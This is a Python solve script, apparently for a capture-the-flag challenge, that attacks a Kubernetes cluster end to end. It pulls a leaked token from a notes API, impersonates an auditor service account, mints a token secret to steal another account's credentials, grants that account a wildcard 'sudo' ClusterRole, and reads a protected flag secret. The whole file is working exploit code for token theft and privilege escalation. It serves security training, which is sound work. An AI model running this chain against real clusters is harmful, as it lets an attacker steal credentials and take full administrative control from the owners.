import base64
import json
import re
import requests
import subprocess

HOST = '555b4d6e-0621-4b22-bdd0-8cde70b19ebe.chall.nnsc.tf'

r = requests.get(f'https://{HOST}/apis/nnsctf.no/v1/namespaces/private-notes/notes/1cf56255-ce46-4b8a-9555-b6c71c202db5')
r.raise_for_status()
token1 = r.json()['spec']['content']

with open('kubeconfig-intern.yaml', 'w') as f:
    f.write(f'''\
apiVersion: v1
kind: Config
clusters:
  - name: notes
    cluster:
      server: https://{HOST}:443
contexts:
  - name: devsecoops-intern@notes
    context:
      cluster: notes
      namespace: devsecoops
      user: devsecoops-intern
users:
  - name: devsecoops-intern
    user:
      token: {token1}
current-context: devsecoops-intern@notes
''')


def wrapped_subprocess(args, **kwargs):
    print('$', ' '.join(args))
    out = subprocess.check_output(args, text=True, **kwargs)
    print(out, end='\n' if not out or out[-1] != '\n' else '')
    return out


events = wrapped_subprocess([
    'kubectl',
    '--kubeconfig=kubeconfig-intern.yaml',
    '--as=system:serviceaccount:devsecoops:devsecoops-auditor',
    'get', 'events.events.k8s.io'
])
podname = re.search(
    r'Created pod: (agile-devsecoops-certified-app\S+)', events).group(1)

poddata = wrapped_subprocess([
    'kubectl',
    '--kubeconfig=kubeconfig-intern.yaml',
    '--as=system:serviceaccount:devsecoops:devsecoops-auditor',
    'get', 'pod', podname, '-o', 'json'
])
saname = json.loads(poddata)['spec']['serviceAccount']

with open('sa-secret.yaml', 'w') as f:
    f.write(f'''\
apiVersion: v1
kind: Secret
metadata:
  name: sa-token
  annotations:
    kubernetes.io/service-account.name: {saname}
type: kubernetes.io/service-account-token
''')

wrapped_subprocess([
    'kubectl',
    '--kubeconfig=kubeconfig-intern.yaml',
    '--as=system:serviceaccount:devsecoops:devsecoops-auditor',
    'apply', '-f', 'sa-secret.yaml'
])
sadata = wrapped_subprocess([
    'kubectl',
    '--kubeconfig=kubeconfig-intern.yaml',
    '--as=system:serviceaccount:devsecoops:devsecoops-auditor',
    'get', 'secret', 'sa-token', '-o', 'json'
])

token2 = base64.b64decode(json.loads(sadata)['data']['token']).decode()

with open('kubeconfig-scrum-daddy.yaml', 'w') as f:
    f.write(f'''\
apiVersion: v1
kind: Config
clusters:
  - name: notes
    cluster:
      server: https://{HOST}:443
contexts:
  - name: scrum-daddy@notes
    context:
      cluster: notes
      namespace: devsecoops
      user: scrum-daddy
users:
  - name: scrum-daddy
    user:
      token: {token2}
current-context: scrum-daddy@notes
''')

with open('clusterrole.yaml', 'w') as f:
    f.write(f'''\
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: sudo
rules:
  - apiGroups:
      - '*'
    resources:
      - '*'
    verbs:
      - '*'
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: sudo
subjects:
  - kind: ServiceAccount
    name: {saname}
    namespace: devsecoops
roleRef:
  kind: ClusterRole
  name: sudo
  apiGroup: rbac.authorization.k8s.io
''')

try:
    wrapped_subprocess([
        'kubectl',
        '--kubeconfig=kubeconfig-scrum-daddy.yaml',
        'create', '-f', 'clusterrole.yaml'
    ])
except subprocess.CalledProcessError:
    pass

flagdata = wrapped_subprocess([
    'kubectl',
    '--kubeconfig=kubeconfig-scrum-daddy.yaml',
    'get', 'secrets', '-n', 'daddy-only', 'daddys-secret-flag', '-o', 'json'
])
flag = base64.b64decode(json.loads(flagdata)['data']['flag'])

print(flag)
